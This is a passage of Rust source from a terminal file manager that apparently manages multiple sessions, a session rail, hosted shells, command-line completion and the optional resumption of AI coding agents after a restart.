            GoTop => self.move_plain(|p| p.go_home()),
            GoBottom => self.move_plain(|p| p.go_end()),

            ExtendSelection(delta) => self.extend(|p| p.extend_selection_by(delta)),
            ExtendSelectionPage(pages) => self.extend(|p| p.extend_selection_page(pages)),
            ExtendSelectionToTop => self.extend(|p| p.extend_selection_to(0)),
            ExtendSelectionToBottom => self.extend(|p| {
                let last = p.len().saturating_sub(1);
                p.extend_selection_to(last)
            }),

            Activate => self.activate(),
            GoParent => self.go_parent(),
            DirectoryHistory => self.open_history(),
            HistoryOrder(order) => self.set_history_order(order),

            // Tab visits all three stops in order. This costs the strict
            // Tab-alternates-two-panels reflex from Norton Commander; Esc is the
            // fast two-way toggle that replaces it.
            FocusNext => {
                // On the command line Tab completes what is being typed, and
                // only moves the keyboard when there is nothing to complete —
                // so it means what it means in a shell, without losing the way
                // out of the line.
                if self.ses().focus == Focus::CommandLine
                    && self.mode == Mode::Normal
                    && self.request_completion()
                {
                    return;
                }
                self.clear_quick_search();
                match (self.ses().focus, self.ses().active) {
                    (Focus::Panel, PanelId::Left) => self.ses_mut().active = PanelId::Right,
                    (Focus::Panel, PanelId::Right) => self.ses_mut().focus = Focus::CommandLine,
                    (Focus::CommandLine, _) => {
                        self.ses_mut().focus = Focus::Panel;
                        self.ses_mut().active = PanelId::Left;
                    }
                }
            }

            // Esc never changes which panel is current — that is the whole point
            // of having it alongside Tab.
            FocusToggle => {
                self.clear_quick_search();
                self.ses_mut().focus = match self.ses().focus {
                    Focus::Panel => Focus::CommandLine,
                    Focus::CommandLine => Focus::Panel,
                };
            }

            // --- sessions ---
            // Opening the rail hands it the keyboard: a list you can see but
            // not drive is a worse version of one you cannot see.
            ToggleRail => {
                if self.rail_open {
                    self.close_rail();
                } else {
                    self.rail_open = true;
                    self.mode = Mode::Rail {
                        selected: self.sessions.current_index(),
                    };
                    self.status =
                        "sessions: enter switch \u{b7} n new \u{b7} r rename \u{b7} d close".into();
                }
            }

            SwitchSession(index) => {
                if self.sessions.switch_to(index) {
                    self.after_session_switch();
                } else if index >= self.sessions.len() {
                    // Say why nothing happened. A silently ignored shortcut is
                    // indistinguishable from a broken one.
                    self.status =
                        format!("no session {} — {} open", index + 1, self.sessions.len());
                }
            }

            CycleSession(step) => {
                self.sessions.cycle(step);
                self.after_session_switch();
            }

            NewSession => {
                // Opens on the directory you are standing in: a new session is
                // almost always "the same place, a different task".
                let left = self.ses().cwd[0].clone();
                let right = self.ses().cwd[1].clone();
                let name = self.sessions.unused_name();
                self.sessions.create(name, left, right);
                self.reload(PanelId::Left);
                self.reload(PanelId::Right);
                self.rail_open = true;
                self.status = format!(
                    "session {} of {}",
                    self.sessions.current_index() + 1,
                    self.sessions.len()
                );
            }

            CloseSession => {
                let i = self.sessions.current_index();
                match self.sessions.close(i) {
                    Ok(()) => {
                        self.after_session_switch();
                        self.status = format!("session closed — {} left", self.sessions.len());
                    }
                    // Quitting is a different action with a different
                    // confirmation; do not silently turn one into the other.
                    Err(e) => self.status = format!("{e} (F10 quits)"),
                }
            }

            SwitchPanel => {
                let other = self.ses().active.other();
                self.ses_mut().active = other;
            }
            SwapPanels => {
                let s = self.ses_mut();
                s.panels.swap(0, 1);
                s.cwd.swap(0, 1);
                s.generation.swap(0, 1);
            }
            ToggleShell => self.toggle_shell(),
            ToggleFullscreen => self.toggle_fullscreen(),
            UtilitiesMenu => {
                self.mode = Mode::Utilities {
                    selected: crate::ui::menu::first_selectable(&crate::utilities::items(
                        &self.session_menu_rows(),
                    )),
                };
            }
            ExtendCommandSelection(delta) => self.extend_command_selection(delta),
            ExtendCommandSelectionToStart => self.set_command_selection_head(0),
            ExtendCommandSelectionToEnd => {
                let end = self.ses().command_line.chars().count();
                self.set_command_selection_head(end);
            }
            ClipboardCopy => self.copy_selection(),
            ClipboardPaste => self.paste_into_shell(),
            Refresh => self.reload(self.ses().active),

            ToggleSelection => self.active_panel_mut().toggle_selection(),
            InvertSelection => self.active_panel_mut().invert_selection(),
            ClearSelection => self.active_panel_mut().clear_selection(),
            SelectAll => {
                let p = self.active_panel_mut();
                p.clear_selection();
                p.invert_selection();
            }

            SortBy(key) => {
                let p = self.active_panel_mut();
                // Pressing the same sort key again reverses it, as in every
                // orthodox file manager.
                if p.sort_key == key {
                    p.sort_order = match p.sort_order {
                        SortOrder::Ascending => SortOrder::Descending,
                        SortOrder::Descending => SortOrder::Ascending,
                    };
                } else {
                    p.sort_key = key;
                    p.sort_order = SortOrder::Ascending;
                }
                p.resort();
            }
            ToggleHidden => {
                let p = self.active_panel_mut();
                p.show_hidden = !p.show_hidden;
                self.reload(self.ses().active);
            }

            ScreensaverMenu => self.mode = Mode::Picker { selected: 0 },
            ScreensaverNext => self.screensaver_next(),

            ContextMenu => {
                // Anchored on the cursor row, so the keyboard route opens the
                // menu next to what it acts on rather than in a corner.
                let i = Self::idx(self.ses().active);
                let area = self.layout.panels[i];
                let row = (self.ses().panels[i]
                    .cursor()
                    .saturating_sub(self.ses().panels[i].offset()))
                    as u16;
                self.open_context_menu((area.x + 2, area.y.saturating_add(row).saturating_add(1)));
            }

            Quit => self.should_quit = true,

            // Typing replaces a selection the way every editor does, rather
            // than appending past it and leaving a highlight over stale text.
            CommandChar(c) => {
                self.take_command_selection();
                self.ses_mut().command_line.push(c);
            }
            CommandBackspace if self.command_selection.is_some() => {
                self.take_command_selection();
            }
            CommandBackspace => {
                self.ses_mut().command_line.pop();
            }
            CommandClear => {
                self.command_selection = None;
                self.ses_mut().command_line.clear();
            }
            CommandSubmit => self.run_command(),

            QuickSearch(c) => self.quick_search(c),
            // Backspace with an empty search buffer goes up a directory, the
            // way every file manager since Norton has. The search only owns the
            // key while it has something to delete: erase what you typed, and
            // the next Backspace leaves the directory.
            QuickSearchBackspace if self.quick_search.is_empty() => self.go_parent(),
            QuickSearchBackspace => {
                self.quick_search.pop();
                if self.quick_search.is_empty() {
                    self.status.clear();
                } else {
                    let needle = self.quick_search.clone();
                    self.seek(&needle);
                }
            }

            Help => {
                self.mode = Mode::Help { scroll: 0 };
                self.begin_help_entrance();
            }

            // Everything below is claimed by the keymap but owned by an agent
            // that has not built it yet. Say so out loud rather than doing nothing.
            UserMenu => self.open_user_menu(),
            View => self.open_viewer(),
            Edit => self.edit_here(),
            Copy => self.status = self.pending_op("F5 copy"),
            Move => self.status = self.pending_op("F6 move"),
            MakeDir => self.status = "F7 mkdir — not implemented yet".into(),
            Delete => self.status = self.pending_op("F8 delete"),
            Unimplemented(what) => self.status = format!("{what} — not implemented yet"),
        }
    }

    /// Note that the session set changed. The actual write is debounced by the
    /// event loop: renaming a session one keystroke at a time should not mean
    /// one file write per keystroke.
    pub(crate) fn touch_sessions(&mut self) {
        if self.store.is_some() {
            self.dirty_at = Some(std::time::Instant::now());
        }
    }

    /// Write now if the debounce has elapsed. Returns when the next flush is due.
    fn flush_sessions(&mut self) -> Option<std::time::Instant> {
        const DEBOUNCE: std::time::Duration = std::time::Duration::from_millis(600);
        let due = self.dirty_at? + DEBOUNCE;
        if std::time::Instant::now() < due {
            return Some(due);
        }
        self.dirty_at = None;
        if let Some(store) = &self.store
            && let Err(e) = store.save(&self.sessions, false)
        {
            // Say so once rather than every 600ms: a read-only config directory
            // would otherwise fill the status line forever.
            self.status = format!("could not save sessions: {e}");
        }
        None
    }

    /// Write the sessions now, outside the debounce.
    ///
    /// The 600ms debounce is right for preferences — a rename typed one letter
    /// at a time must not be one file write per letter — and wrong for the two
    /// facts whose loss cannot be undone: the conversation id a session owns,
    /// and the agent seen running in it. Both are what a restart needs to give
    /// the user back what they were talking to, both change rarely, and the
    /// window the debounce leaves open is exactly the window a `kill -9` falls
    /// into.
    ///
    /// `clean_exit: false`, because this is a run still going. Only
    /// [`save_on_exit`](Self::save_on_exit) may claim otherwise.
    fn save_now(&mut self) {
        self.dirty_at = None;
        if let Some(store) = &self.store
            && let Err(e) = store.save(&self.sessions, false)
        {
            self.status = format!("could not save sessions: {e}");
        }
    }

    /// Notice when a shell's foreground process group moves, and only then go
    /// and look at what it is running.
    ///
    /// The cheap half of keeping a record of hosted agents. A program starting
    /// or finishing in a shell moves that shell's foreground group, and nothing
    /// else does — so this one syscall per shell, on frames that were going to
    /// happen anyway, replaces a `ps` on a timer. The timer version is what the
    /// idle-CPU budget cannot pay for: a fork every few seconds, forever, to
    /// answer a question whose answer changes twice a day.
    #[cfg(unix)]
    pub(crate) fn watch_agents(&mut self) {
        let now = self.sessions.foreground_groups();
        if now == self.agent_fg {
            return;
        }
        self.agent_fg = now;
        let shells = self.sessions.shell_pids();
        if shells.is_empty() {
            // Every shell has gone. Nothing to scan, and nothing to clear
            // either: a shell that closed did not take its agent's conversation
            // with it.
            return;
        }
        // Off the render loop: reading the process table is a fork, and a fork
        // in the middle of a frame is the frame budget spent on bookkeeping.
        if tokio::runtime::Handle::try_current().is_err() {
            return;
        }
        let tx = self.tx.clone();
        tokio::task::spawn_blocking(move || {
            let _ = tx.send(Update::Agents(dmac_session::agent::scan(&shells)));
        });
    }

    #[cfg(not(unix))]
    pub(crate) fn watch_agents(&mut self) {}

    /// Write down what the sessions are hosting, if it is news.
    ///
    /// Immediately, not on the debounce. This is the record that makes a
    /// restart able to put an agent back, and the window between "claude
    /// started" and "the next unrelated save" is exactly the window in which
    /// closing the terminal window loses it.
    #[cfg(unix)]
    pub(crate) fn record_agents(&mut self, seen: &[(dmac_session::SessionId, Option<String>)]) {
        if self.sessions.observe_agents(seen) {
            self.save_now();
        }
    }

    #[cfg(not(unix))]
    pub(crate) fn record_agents(&mut self, _seen: &[(dmac_session::SessionId, Option<String>)]) {}

    /// Make sure every session owns a conversation, and put it on disk if any
    /// had to be made.
    ///
    /// Called where sessions come into existence — at startup after the
    /// restore, and when one is created — so that by the time a shell can be
    /// opened the id it will hand to an agent has already been written.
    pub(crate) fn ensure_conversations(&mut self) {
        if self.sessions.ensure_conversations() {
            self.save_now();
        }
    }

    /// Final write, marking a clean exit so the next start knows we did not crash.
    fn save_on_exit(&mut self) {
        // What is running has to be looked at before anything is torn down:
        // afterwards there is nothing left to ask. One read of the process
        // table for every session, not one per session — and through the same
        // path the running commander uses, so a clean exit and a crash leave
        // the same kind of record rather than two that can disagree.
        // Where the editor window is, asked once and here: this is the last
        // moment it can be observed, and the session that is on screen is the
        // one whose window the user has most likely just moved. The others were
        // read when they were last entered.
        let here = self.sessions.current_index();
        if let Some(cwd) = self
            .sessions
            .get(here)
            .map(|s| s.cwd[Self::idx(s.active)].clone())
            .filter(dmac_vfs::VfsPath::is_local)
        {
            let window = read_frame(cwd.as_path());
            self.sessions.at_mut(here).editor = window;
        }
        #[cfg(unix)]
        {
            let shells = self.sessions.shell_pids();
            if !shells.is_empty() {
                let seen = dmac_session::agent::scan(&shells);
                self.sessions.observe_agents(&seen);
            }
        }
        if let Some(store) = &self.store
            && let Err(e) = store.save(&self.sessions, true)
        {
            eprintln!("dmac: could not save sessions: {e}");
        }
        // Saved first, then torn down: if shutting the processes down goes
        // wrong, the session layout is already on disk. The grace period is
        // long enough for a program to release what it is holding and short
        // enough not to be felt as a hang.
        self.sessions
            .shutdown(std::time::Duration::from_millis(400));
    }

    /// Switch to whichever session the pointer is over in the rail.
    fn pick_rail_session(&mut self, row: u16) {
        let rail = self.layout.rail;
        let detail = crate::ui::rail::detailed(self.layout.rail_outer.width);
        if let Some(i) = crate::ui::rail::session_at_row(&self.sessions, rail, detail, row)
            && self.sessions.switch_to(i)
        {
            self.after_session_switch();
        }
    }

    /// Set the width of whichever rail is on screen — the resting strip or the
    /// opened list. They are remembered separately: they answer different
    /// questions, and one width would make one of them wrong.
    fn set_rail_width(&mut self, want: u16) {
        let most = crate::ui::rail::max_width(self.layout.screen.width);
        let want = want.min(most);
        let rail = &mut self.sessions.rail;
        let before = *rail;
        if self.rail_open {
            rail.expanded = want.max(1);
        } else {
            // Zero is allowed at rest, and means it: someone who wants the
            // columns back can have them, and Ctrl-T still opens the list.
            rail.collapsed = want;
        }
        if self.sessions.rail != before {
            self.touch_sessions();
        }
    }

    /// Widen or narrow the rail by `by` columns.
    fn resize_rail(&mut self, by: i16) {
        let now = if self.rail_open {
            self.sessions.rail.expanded
        } else {
            self.sessions.rail.collapsed
        };
        let want = i32::from(now) + i32::from(by);
        self.set_rail_width(u16::try_from(want.max(0)).unwrap_or(u16::MAX));
        let now = if self.rail_open {
            self.sessions.rail.expanded
        } else {
            self.sessions.rail.collapsed
        };
        self.status = format!("rail {now} columns \u{2014} \u{2190}/\u{2192} to resize");
    }

    fn close_rail(&mut self) {
        self.rail_open = false;
        if matches!(self.mode, Mode::Rail { .. }) {
            self.mode = Mode::Normal;
        }
        self.status.clear();
    }

    /// The rail as a manager: navigate, switch, create, rename, close.
    /// The next row up or down in the rail, skipping what is folded away.
    ///
    /// Wraps, as the list always has. Falls back to the row it was given when
    /// there is nothing drawn to move to, which cannot happen with a session
    /// open but is cheaper to handle than to prove impossible.
    fn rail_step(&self, selected: usize, by: isize) -> usize {
        let rows = self.sessions.visible();
        if rows.is_empty() {
            return selected;
        }
        let at = rows.iter().position(|&i| i == selected).unwrap_or(0) as isize;
        let next = (at + by).rem_euclid(rows.len() as isize) as usize;
        rows.get(next).copied().unwrap_or(selected)
    }

    fn rail_key(&mut self, k: KeyEvent, selected: usize) {
        match k.code {
            KeyCode::Esc => self.close_rail(),
            // Through the rows that are drawn, not through the sessions: the
            // children of a folded group are not on screen, and a cursor that
            // walks onto one lands on a row nobody can see.
            KeyCode::Up => {
                self.mode = Mode::Rail {
                    selected: self.rail_step(selected, -1),
                }
            }
            KeyCode::Down => {
                self.mode = Mode::Rail {
                    selected: self.rail_step(selected, 1),
                }
            }
            KeyCode::Enter => {
                if self.sessions.switch_to(selected) {
                    self.after_session_switch();
                }
                self.close_rail();
            }
            // Nothing to the left or right of a one-column list, so the
            // horizontal arrows resize it. `-` and `+` do the same, for
            // terminals that eat modified arrows.
            KeyCode::Left | KeyCode::Char('-') => self.resize_rail(-1),
            KeyCode::Right | KeyCode::Char('+' | '=') => self.resize_rail(1),
            KeyCode::Char('n') => self.open_prompt(PromptIntent::NewSession, String::new()),
            // Fold the group under this row away, or open it. Space because it
            // is what folds a row in every tree anyone has used, and because
            // the letters here are spoken for.
            KeyCode::Char(' ') => {
                if self.sessions.toggle_collapsed(selected) {
                    self.touch_sessions();
                    self.mode = Mode::Rail { selected };
                } else {
                    self.status = "nothing is grouped under that one".into();
                }
            }
            // A second agent on the same work, in its own session, drawn under
            // the one it came from. The same thing F9 offers, on the key that
            // is already about managing sessions.
            KeyCode::Char('a') => {
                if self.sessions.switch_to(selected) {
                    self.after_session_switch();
                }
                self.close_rail();
                self.start_agent_beside();
            }
            KeyCode::Char('r') => {
                let current = self
                    .sessions
                    .get(selected)
                    .map(|s| s.name.clone())
                    .unwrap_or_default();
                self.open_prompt(PromptIntent::RenameSession(selected), current);
            }
            KeyCode::Char('d') | KeyCode::Delete => {
                // Asked before, not reported after: closing a group takes what
                // hangs off it, and "closed 4 sessions" is a thing that has
                // already happened to you.
                let going = self.sessions.group_size(selected);
                match self.sessions.close(selected) {
                    Ok(()) => {
                        let keep = selected.min(self.sessions.len() - 1);
                        self.mode = Mode::Rail { selected: keep };
                        self.after_session_switch();
                        self.status = match going {
                            1 => format!("session closed \u{2014} {} left", self.sessions.len()),
                            n => format!(
                                "group closed, {n} sessions \u{2014} {} left",
                                self.sessions.len()
                            ),
                        };
                    }
                    // Quitting is a different action with a different confirmation.
                    Err(e) => self.status = format!("{e} (F10 quits)"),
                }
            }
            // Bare digits while the rail has focus: the numbers are on screen
            // right there, so demanding a modifier would be perverse.
            KeyCode::Char(c @ '1'..='9') => {
                let i = c.to_digit(10).unwrap_or(1) as usize - 1;
                if self.sessions.switch_to(i) {
                    self.after_session_switch();
                }
                self.close_rail();
            }
            _ => {}
        }
    }

    fn open_prompt(&mut self, intent: PromptIntent, initial: String) {
        self.prompt_value = initial;
        self.mode = Mode::Prompt { intent };
    }

    fn prompt_key(&mut self, k: KeyEvent, intent: PromptIntent) {
        match k.code {
            KeyCode::Esc => {
                self.prompt_value.clear();
                // Back to the rail, not out to the panels: the prompt was opened
                // from there, and Esc means one level back.
                self.mode = Mode::Rail {
                    selected: self.sessions.current_index(),
                };
            }
            KeyCode::Backspace => {
                self.prompt_value.pop();
            }
            KeyCode::Enter => self.submit_prompt(intent),
            KeyCode::Char(c) if !k.modifiers.contains(KeyModifiers::CONTROL) => {
                self.prompt_value.push(c)
            }
            _ => {}
        }
    }

    fn submit_prompt(&mut self, intent: PromptIntent) {
        let value = std::mem::take(&mut self.prompt_value);
        match intent {
            PromptIntent::RenameSession(index) => match self.sessions.rename(index, &value) {
                Ok(()) => {
                    self.touch_sessions();
                    self.mode = Mode::Rail { selected: index };
                    self.status = format!("renamed to {}", value.trim());
                }
                // Stay in the prompt with the text intact, so a rejected name can
                // be corrected rather than retyped.
                Err(e) => {
                    self.prompt_value = value;
                    self.status = e.to_string();
                }
            },
            PromptIntent::ViewSearch => {
                self.view_search = value;
                // Back to the file, and straight to the first match rather than
                // making the user press `n` to find out whether there was one.
                let hex = matches!(self.mode, Mode::View { hex: true, .. })
                    || self
                        .document
                        .as_ref()
                        .is_some_and(|d| d.kind() == dmac_view::Kind::Binary);
                self.mode = Mode::View { scroll: 0, hex };
                // From before the first, so stepping forward lands on it.
                self.view_match = usize::MAX;
                self.step_match(1, hex);
            }
            PromptIntent::NewSession => {
                let name = if value.trim().is_empty() {
                    self.sessions.unused_name()
                } else {
                    value.trim().to_string()
                };
                let left = self.ses().cwd[0].clone();
                let right = self.ses().cwd[1].clone();
                let i = self.sessions.create(name, left, right);
                self.reload(PanelId::Left);
                self.reload(PanelId::Right);
                self.ensure_conversations();
                self.touch_sessions();
                self.mode = Mode::Rail { selected: i };
                self.after_session_switch();
            }
        }
    }

    /// The area the shell is drawn in, in cells. Recorded by the renderer, so
    /// the PTY is always exactly the size of what the user can see.
    pub(crate) fn shell_size(&self) -> (u16, u16) {
        let a = self.layout.shell;
        if a.width >= 2 && a.height >= 2 {
            (a.width, a.height)
        } else {
            // Before the first frame there is no recorded size. Something
            // plausible beats zero: the child is told the truth on the next draw.
            (80, 24)
        }
    }

    /// Complete the word being typed on the command line.
    ///
    /// The candidates come from the filesystem, so they are gathered on a task
    /// and delivered like a directory listing. Tab has to stay instant even
    /// when the directory being completed against is a slow network mount.
    fn request_completion(&mut self) -> bool {
        let line = self.ses().command_line.clone();
        let (start, word) = dmac_core::complete::word_at_end(&line);
        // Nothing to complete: let Tab go back to being the focus key.
        if word.is_empty() {
            return false;
        }

        self.completion_gen = self.completion_gen.wrapping_add(1);
        let generation = self.completion_gen;
        let session = self.ses().id;
        let cwd = self.ses().cwd[Self::idx(self.ses().active)].clone();
        let first = dmac_core::complete::is_first_word(&line, start);
        let word = word.to_string();
        let tx = self.tx.clone();

        tokio::task::spawn_blocking(move || {
            let items = if first && !word.contains('/') {
                commands_starting_with(&word)
            } else {
                paths_starting_with(&word, cwd.as_path())
            };
            let _ = tx.send(Update::Completion {
                session,
                generation,
                start,
                items,
            });
        });
        true
    }

    fn apply_completion(
        &mut self,
        session: SessionId,
        generation: u64,
        start: usize,
        items: Vec<String>,
    ) {
        use dmac_core::complete::{Completion, resolve, splice};
        if generation != self.completion_gen || self.ses().id != session {
            return;
        }
        let line = self.ses().command_line.clone();
        // The line moved on while the directory was being read.
        if start > line.len() {
            return;
        }
        let word = &line[start..];

        match resolve(word, items) {
            Completion::None => self.status = "no match".into(),
            Completion::Single(full) => {
                self.ses_mut().command_line = splice(&line, start, &full);
                self.status.clear();
            }
            Completion::Many { prefix, items } => {
                self.ses_mut().command_line = splice(&line, start, &prefix);
                // bash prints the candidates rather than guessing; the status
                // line is where this program says things.
                let shown: Vec<&str> = items.iter().take(12).map(String::as_str).collect();
                let more = items.len().saturating_sub(shown.len());
                self.status = if more > 0 {
                    format!("{}  … and {more} more", shown.join("  "))
                } else {
                    shown.join("  ")
                };
            }
        }
    }

    /// A callback a hosted shell can use to ask for a repaint.
    ///
    /// This is the whole reason a hosted program is live rather than a picture
    /// that updates when you type: without it `ping`, `tail -f` or a running
    /// build produce output that nothing is waiting for.
    fn waker(&self) -> Option<dmac_pty::Waker> {
        let tx = self.tx.clone();
        Some(Arc::new(move || {
            let _ = tx.send(Update::ShellOutput);
        }))
    }

    /// Bookkeeping immediately before a frame is drawn.
    ///
    /// The flag is cleared *before* the screen is read, never after. Clearing it
    /// afterwards loses whatever the child printed while the frame was being
    /// composed: that output is already marked as shown but was never on it, and
    /// since the reader only wakes on the clean-to-dirty edge, nothing would ask
    /// again. The last line of a finished build would sit there invisible.
    /// Clearing first can only cost one redundant frame, which is the cheap
    /// direction to be wrong in.
    ///
    /// It is also the throttle: while the flag stays set the reader thread stays
    /// quiet, because a repaint has been asked for and not yet given.
    pub(crate) fn before_frame(&mut self) {
        if self.ses().view != View::Shell || self.last_shell_frame.elapsed() < SHELL_FRAME_FLOOR {
            return;
        }
        // The screen is about to change under the selection, which is held in
        // visible coordinates. At the live bottom the text scrolls out from
        // under it, so it goes: keeping it would highlight whatever landed in
        // those cells. Scrolled back, `vt100` holds the visible rows still and
        // the highlight stays on its own characters, so there is nothing to do
        // — which is the whole reason reading back is worth having. A drag in
        // progress is the user's, and is left alone either way.
        if !self.selecting
            && self.shell_selection.is_some()
            && self
                .ses()
                .hosted()
                .is_some_and(|s| s.dirty() && s.scroll_offset() == 0)
        {
            self.shell_selection = None;
            self.shell_caret = None;
        }
        self.last_shell_frame = std::time::Instant::now();
        if let Some(s) = self.ses().hosted() {
            s.mark_drawn();
        }
    }

    /// When the hosted shell is owed a frame it has not been given yet.
    ///
    /// Only ever set while output is outstanding, so an idle shell costs no
    /// timer — the pane sits there for free until the child says something.
    fn shell_deadline(&self) -> Option<std::time::Instant> {
        if self.ses().view != View::Shell {
            return None;
        }
        self.ses()
            .hosted()
            .is_some_and(|s| s.dirty())
            .then(|| self.last_shell_frame + SHELL_FRAME_FLOOR)
    }

    /// Put back whatever was running in these sessions when they were saved.
    ///
    /// Started after the first frame, never before it: a cold start has 80ms to
    /// show something, and spawning shells inside that budget would spend it on
    /// work the user cannot see yet.
    /// Collect what the last run was hosting, and ask.
    ///
    /// Nothing is started here. Rebuilding and restarting is something this
    /// program's own author does dozens of times an hour, and each restart
    /// silently spawning an agent — which reads its history back and may act on
    /// it — is not a thing to do behind someone's back.
    /// List a session's panels, if that has not happened yet.
    ///
    /// Listing every panel of every session at startup is a directory walk per
    /// panel before the first frame — a cost that grows with how many sessions
    /// you keep and buys nothing, because you can only look at one of them.
    /// Listings still stay in memory once made, so switching back is instant.
    pub(crate) fn ensure_loaded(&mut self, index: usize) {
        if index >= self.sessions.len() || self.sessions.at_mut(index).loaded {
            return;
        }
        self.sessions.at_mut(index).loaded = true;
        self.reload_session(index, PanelId::Left);
        self.reload_session(index, PanelId::Right);
    }

    pub(crate) fn reattach_agents(&mut self) {
        self.pending.clear();
        for i in 0..self.sessions.len() {
            let Some(saved) = self.sessions.at_mut(i).reattach.take() else {
                continue;
            };
            // Never verbatim: what belonged to the run that ended — its
            // socket, named in a `--mcp-config` — died with it, and a
            // `--session-id` naming a conversation that now exists is refused
            // on the way back in. What the *user* chose is kept, and so is the
            // conversation: the agent is the authority on which one it was in,
            // and if that is not the one this session remembered, the session
            // is what was out of date.
            let session = self.sessions.at_mut(i);
            if let Some(c) = dmac_session::agent::conversation_of(&saved) {
                session.conversation = Some(c);
            }
            let id = session.id.0.to_string();
            let conversation = session.conversation_id().to_string();
            let command = dmac_session::agent::resume_command(&id, &conversation, &saved);
            let program = command
                .split_whitespace()
                .next()
                .and_then(|w| w.rsplit('/').next())
                .unwrap_or("agent")
                .to_string();
            let session = self.sessions.at_mut(i);
            self.pending.push(Pending {
                session: i,
                session_name: session.name.clone(),
                program,
                command,
                conversation: session.conversation_id().to_string(),
                chosen: true,
            });
        }
        if !self.pending.is_empty() {
            self.mode = Mode::Reattach { selected: 0 };
        }
    }

    /// Start the agents that were ticked.
    fn resume_pending(&mut self) {
        let wanted: Vec<Pending> = self.pending.drain(..).filter(|p| p.chosen).collect();
        self.mode = Mode::Normal;
        let mut started = 0;
        let mut cleared = 0;

        for p in &wanted {
            // Anything still holding this conversation is an orphan from a run
            // that did not get to clean up, and it is holding exactly what we
            // are about to ask for. Left alone it produces "that session is
            // already in use" on a fresh start.
            cleared += dmac_session::agent::clear_orphans(&p.conversation);

            let waker = self.waker();
            let (cols, rows) = self.shell_size();
            if p.session >= self.sessions.len() {
                continue;
            }
            let session = self.sessions.at_mut(p.session);
            match session.shell(cols, rows, waker) {
                Ok(shell) => {
                    if shell.run(&p.command).is_ok() {
                        // Show the shell: reattaching something and leaving the
                        // user on the panels hides the very thing just started.
                        session.view = dmac_session::View::Shell;
                        started += 1;
                    }
                }
                Err(e) => self.status = format!("could not resume {}: {e}", p.program),
            }
        }

        if started > 0 {
            self.status = match cleared {
                0 => format!("resumed {started}"),
                n => format!("resumed {started} — cleared {n} left over"),
            };
        }
    }

    /// Say no. The conversation ids are kept either way: running the agent by
    /// hand later still comes back to where it was.
    fn decline_pending(&mut self) {
        let n = self.pending.len();
        self.pending.clear();
        self.mode = Mode::Normal;
        if n > 0 {
            self.status = format!("left {n} conversation(s) alone — run the agent to pick one up");
        }
    }

    /// Bring this session's editor window forward, if it has one.
    ///
    /// Raised, never moved: the placement is a thing you asked for once, when
    /// you opened the directory, and a window you have since dragged somewhere
    /// is where you wanted it. Switching session is not a request to rearrange
    /// the screen — only to see the right project on it.
    fn raise_editor_here(&mut self) {
        let Ok(dir) = self.editor_here_target() else {
            return;
        };
        // What this session had open last time, and where. Only used when the
        // editor turns out to have no window for that folder — see below.
        let remembered = self
            .ses()
            .editor
            .clone()
            .filter(|w| w.dir == dir.display().to_string());
        let id = self.sessions.current().id;
        let tx = self.tx.clone();
        // Off the render thread, and only when there is one to be off: a test
        // switches sessions too, and it has no runtime to spawn onto.
        if let Ok(runtime) = tokio::runtime::Handle::try_current() {
            runtime.spawn_blocking(move || {
                // Already open somewhere: bring it forward and leave it exactly
                // where the user put it. Restoring a window that is on screen
                // is not restoring anything, it is moving something.
                if matches!(dmac_desktop::raise_editor_for(&dir), Ok(true)) {
                    let _ = tx.send(Update::EditorFrame {
                        session: id,
                        window: read_frame(&dir),
                    });
                    return;
                }
                if let Some(w) = remembered {
                    let frame = dmac_desktop::Frame {
                        x: w.x,
                        y: w.y,
                        width: w.width,
                        height: w.height,
                    };
                    let _ = dmac_desktop::restore_editor(&dir, frame);
                }
            });
        }
    }

    /// Write down where this session's editor window is, if it has one.
    ///
    /// Off the render loop, because asking the window server costs a fork and
    /// an Apple Event round trip. Asked when leaving a session and again on the
    /// way out, which between them covers every way a window's position stops
    /// being observable — the alternative, polling it, spends the idle budget
    /// watching a rectangle that changes twice a day.
    pub(crate) fn capture_editor_frame(&mut self, index: usize) {
        let Some(session) = self.sessions.get(index) else {
            return;
        };
        let id = session.id;
        let cwd = session.cwd[Self::idx(session.active)].clone();
        if !cwd.is_local() {
            return;
        }
        let dir = cwd.as_path().to_path_buf();
        let tx = self.tx.clone();
        if let Ok(runtime) = tokio::runtime::Handle::try_current() {
            runtime.spawn_blocking(move || {
                let _ = tx.send(Update::EditorFrame {
                    session: id,
                    window: read_frame(&dir),
                });
            });
        }
    }

    /// Every session, for the menu that offers to jump to them — in the rail's
    /// order, with the rail's marks.
    ///
    /// The one you are in comes along, flagged: the menu draws it and refuses
    /// to act on it. Filtering it out here was tidier and read worse — the rail
    /// listed five, the menu four, and the digits skipped the missing one, so
    /// what the eye found was a lost session rather than a place you already
    /// are.
    pub(crate) fn session_menu_rows(&self) -> Vec<crate::utilities::SessionRow> {
        let here = self.sessions.current_index();
        // The visible list, and in its order: a folded group shows its own row
        // and not what is under it, exactly as the rail draws it. Two lists that
        // disagree about which sessions there are is worse than either.
        let rows = self.sessions.visible();
        let tree = rows.iter().any(|&i| self.sessions.depth(i) == 1);
        rows.into_iter()
            .filter_map(|index| {
                let s = self.sessions.get(index)?;
                Some(crate::utilities::SessionRow::new(
                    index,
                    &s.name,
                    index == here,
                    self.sessions.depth(index),
                    self.sessions.has_children(index).then_some(s.collapsed),
                    tree,
                ))
            })
            .collect()
    }

    /// Driving the "resume?" question.
    fn reattach_key(&mut self, k: KeyEvent, selected: usize) {
        let last = self.pending.len().saturating_sub(1);
        match k.code {
            KeyCode::Esc | KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::F(10) => {
                self.decline_pending()
            }
            KeyCode::Enter | KeyCode::Char('y') | KeyCode::Char('Y') => self.resume_pending(),
            KeyCode::Up => {
                self.mode = Mode::Reattach {
                    selected: selected.saturating_sub(1),
                }
            }
            KeyCode::Down => {
                self.mode = Mode::Reattach {
                    selected: (selected + 1).min(last),
                }
            }
            // Space unticks one without answering for the rest: on a restart
            // with several sessions going, the answer is often "that one, not
            // the other three".
            KeyCode::Char(' ') => {
                if let Some(p) = self.pending.get_mut(selected) {
                    p.chosen = !p.chosen;
                }
            }
            _ => {}
        }
    }

    /// Quit as if F10 had been pressed. Used when the terminal goes away.
    pub(crate) fn request_quit(&mut self) {
        self.should_quit = true;
    }

    /// Where this binary was built from, if it was built from a source tree.
    ///
    /// `target/<profile>/dmac` sits two directories below the workspace root,
    /// so the manifest is where to look. A binary installed somewhere else has
    /// no source tree and simply restarts without rebuilding.
    fn source_tree() -> Option<(std::path::PathBuf, String)> {
        let exe = std::env::current_exe().ok()?;
        let profile = exe.parent()?;
        let root = profile.parent()?.parent()?;
        let name = profile.file_name()?.to_str()?.to_string();
        root.join("Cargo.toml")
            .is_file()
